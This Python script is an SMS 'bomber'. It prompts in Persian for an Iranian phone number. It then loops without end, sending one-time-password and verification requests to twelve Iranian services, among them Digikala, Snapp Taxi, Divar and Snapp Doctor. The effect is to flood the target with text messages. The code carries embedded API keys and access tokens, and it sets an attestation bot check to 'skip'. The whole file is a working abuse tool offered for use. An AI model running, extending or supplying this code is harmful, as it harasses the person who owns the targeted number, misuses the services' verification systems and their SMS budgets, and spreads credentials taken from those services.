import requests
import json
import urllib.parse
from time import sleep

def send_digikala_request(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    payload = {
        "backUrl": "/profile/",
        "username": phone,
        "otp_call": False,
        "hash": None
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Digikala Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Digikala Error: {e}")

def send_okala_request(phone):
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "x-api-key": "0d3d5df3-156b-4912-a236-ef562925d290",
        "x-request-id": "13902a54-44e3-422b-b6bf-1321eb62697f"
    }
    payload = {
        "mobile": phone,
        "confirmTerms": True,
        "notRobot": False,
        "ValidationCodeCreateReason": 5,
        "OtpApp": 0,
        "deviceTypeCode": 7,
        "IsAppOnly": False
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Okala Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Okala Error: {e}")

def send_pindo_request(phone):
    url = "https://api.pindo.ir/v1/user/login-register/"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        "x-pindo-source": "mobile",
        "x-pindo-reqid": "4d4de244-1485-40d4-8768-3496c26875da"
    }
    payload = {"phone": phone}
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Pindo Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Pindo Error: {e}")

def send_otaghak_request(phone):
    url = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    payload = {"username": phone, "isShortOtp": True}
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Otaghak Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Otaghak Error: {e}")

def send_drnext_request(phone):
    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "fa",
        "Accept-Encoding": "gzip"
    }
    payload = {
        "source": "besina",
        "mobile": phone,
        "key": "U2FsdGVkX1+freTV85bssxEhuoBrL9XHV5fgEtrYQP0oJsxLebC4iR5k7Ucx7tushtONIuEupqg1zklqDJwcZQ=="
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"DrNext Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"DrNext Error: {e}")

def send_snapp_market_request(phone):
    url = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone}&platform=PWA"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    try:
        response = requests.get(url, headers=headers)
        print(f"Snapp Market Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Snapp Market Error: {e}")

def send_snapp_doctor_request(phone):
    url = f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=%2B98"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "fa",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    try:
        response = requests.get(url, headers=headers)
        print(f"Snapp Doctor Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Snapp Doctor Error: {e}")

def send_okcs_request(phone):
    url = "https://okcs.com/users/mobilelogin"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    encoded_phone = urllib.parse.quote(phone)
    payload = f"mobile={encoded_phone}&url=https%3A%2F%2Fokcs.com%2F"
    try:
        response = requests.post(url, data=payload, headers=headers)
        print(f"OKCS Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"OKCS Error: {e}")

def send_snapp_taxi_request(phone):
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "fa-IR",
        "Accept-Encoding": "gzip",
        "Host": "app.snapp.taxi",
        "x-app-version": "0e422746832fbe49ff9e9738b8b34fb2",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    payload = {
        "cellphone": f"+98{phone[1:]}",
        "attestation": {"method": "skip", "platform": "skip"},
        "extra_methods": []
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Snapp Taxi Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Snapp Taxi Error: {e}")

def send_petabad_request(phone):
    url = "https://petabad.com/api/customer/member/register/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Encoding": "gzip"
    }
    payload = f"email={phone}&accept_term=on"
    try:
        response = requests.post(url, data=payload, headers=headers)
        print(f"Petabad Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Petabad Error: {e}")

def send_divar_request(phone):
    url = "https://api.divar.ir/v5/auth/authenticate"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "x-api-key": "00-2f73899fcf6dcaccd04a57a915735544-98b32055c6d8d677-00",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    payload = {"phone": phone}
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Divar Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Divar Error: {e}")

def send_gharar_request(phone):
    url = "https://gharar.ir/users/phone_number/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "X-Access-Token": "0iGjPQpJrKCpEKFeb0OjN6NRuN6fmbWqeDran0FP90RRSJoBm7br6r6Ttj5wJcu7",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    payload = f"phone={phone}"
    try:
        response = requests.post(url, data=payload, headers=headers)
        print(f"Gharar Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Gharar Error: {e}")

def main():
    phone = input("لطفاً شماره تلفن را وارد کنید (با فرمت 099xxxxxxxx): ")
    if not phone.startswith("09") or len(phone) != 11:
        print("شماره تلفن نامعتبر است. لطفاً شماره را با فرمت 099xxxxxxxx وارد کنید.")
        return

    while True:
        print("\nSending requests...\n")
        send_digikala_request(phone)
        send_okala_request(phone)
        send_pindo_request(phone)
        send_otaghak_request(phone)
        send_drnext_request(phone)
        send_snapp_market_request(phone)
        send_snapp_doctor_request(phone)
        send_okcs_request(phone)
        send_snapp_taxi_request(phone)
        send_petabad_request(phone)
        send_divar_request(phone)
        send_gharar_request(phone)
        print("\nAll requests sent. Restarting...\n")
        sleep(1)  # Optional: Small delay to prevent overwhelming the server

if __name__ == "__main__":
    main()